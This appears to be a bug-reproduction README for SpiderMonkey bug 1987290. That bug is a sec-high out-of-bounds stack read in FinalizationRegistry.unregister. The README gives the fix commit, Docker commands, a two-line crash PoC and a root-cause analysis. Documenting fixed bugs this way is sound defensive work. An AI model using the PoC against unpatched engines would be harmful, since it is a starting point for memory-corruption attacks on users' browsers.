# Bug 1987290 — FinalizationRegistry.unregister OOB args read

- **Bugzilla**: https://bugzilla.mozilla.org/show_bug.cgi?id=1987290
- **Component**: JavaScript Engine
- **Keywords**: csectype-bounds, regression, reporter-external, sec-high
- **CVE**: (not assigned)
- **Date filed**: 2025-09-07
- **Fix commit**: `2b8155c2c4c299955d4ae81423992ed56a838aee` (2025-09-08, Tooru Fujisawa)
  > Bug 1987290 - Part 1: Use get() instead of operator[] to get arguments
  > in FinalizationRegistryObject::unregister. r=jonco
- **Phabricator**: D264002 / D264038
- **Regression of**: Bug 1863140 Part 3 (D263113)

## Reproduce

```bash
docker build -t smlijun/spidermonkey.x86_64:1987290 .
docker run --rm \
  -v $(pwd)/poc.js:/testcase/poc.js \
  smlijun/spidermonkey.x86_64:1987290 \
  sh -c "/out/js /testcase/poc.js"
```

Or:

```bash
cd .. && ./crash_check.sh 1987290
```

## PoC (verbatim from Bugzilla)

```js
const v = new FinalizationRegistry(() => {});
v.unregister();
```

## Root cause

`js/src/builtin/FinalizationRegistryObject.cpp:592` reads the
unregister-token via `args[0]`. When the JS caller passes no arguments,
`JS::CallArgs::operator[]` asserts `i < argc_` (debug build) and the
underlying read accesses past the call frame's outgoing argument area
into adjacent stack memory. ASAN flags it as a deadly signal on a stack
OOB read; debug builds fire the `MOZ_ASSERT(i < argc_)` at
`js/CallArgs.h:213`.

The fix swaps the unchecked indexer for `args.get(0)`, which returns
`UndefinedHandleValue` when the slot is absent.
